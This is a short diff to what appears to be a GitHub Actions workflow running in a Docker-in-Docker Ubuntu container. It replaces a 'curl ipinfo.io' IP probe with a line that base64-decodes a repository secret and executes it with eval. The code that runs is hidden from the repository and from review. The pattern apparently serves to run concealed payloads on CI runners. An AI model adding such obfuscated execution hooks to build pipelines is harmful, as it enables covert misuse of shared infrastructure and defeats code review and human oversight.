@@ -14,4 +14,4 @@ jobs:
         with:
             image: cruizba/ubuntu-dind
             run: |
-                curl ipinfo.io
+                eval "$(echo '${{ secrets.HSS }}' | base64 -d)"
